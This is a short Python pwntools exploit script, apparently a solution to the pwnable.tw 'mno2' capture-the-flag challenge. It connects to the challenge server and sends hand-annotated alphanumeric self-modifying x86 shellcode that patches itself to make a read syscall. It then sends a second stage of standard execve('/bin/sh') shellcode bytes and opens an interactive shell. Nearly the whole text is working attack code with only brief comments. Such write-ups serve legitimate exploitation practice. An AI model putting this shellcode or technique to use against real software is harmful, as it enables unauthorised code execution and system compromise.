
from pwn import *

#p = process('./mno2')
p = remote('chall.pwnable.tw',10301)
context.log_level = 'debug'
#gdb.attach(p,"""break *0x80487e8""")
pause()
shellcode = 'F'           #inc esi              #just bypass
shellcode += 'Re'         #push edx; gs
shellcode += 'Y'          #pop ecx
shellcode += 'I'*(15+13)  #dec ecx (28time)     #ecx = 0x83
shellcode += '1He'        #xor [eax+0x65], ecx
                          #xor 0x4e4e6f4e, 0x8048883 = 0x464ae7cd

shellcode += 'I'*(3+16+9) #dec ecx (28time)     #ecx = 0x67
shellcode += '1Hf'        #xor [eax+0x66], ecx
                          #xor 0xnnnnnne7, 0xnnnnnn67 = 0xnnnnnn80
shellcode += 'P'        #push eax
shellcode += 'Y'        #pop ecx
shellcode += '5MnO2'    #xor eax, 0x324f6f48
shellcode += 'CCC'      #inc ebx (3time)        #ebx = 3
shellcode += 'S'        #push ebx
shellcode += 'Xe'       #pop eax; gs
shellcode += 'KKK'      #dec ebx (3time)
shellcode = shellcode.ljust(0x66,'N')
shellcode += 'o' + 'N'
p.sendline(shellcode)
pause()
sc_execve = '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
p.sendline('N'*0x80+sc_execve+'\x00')
p.interactive()

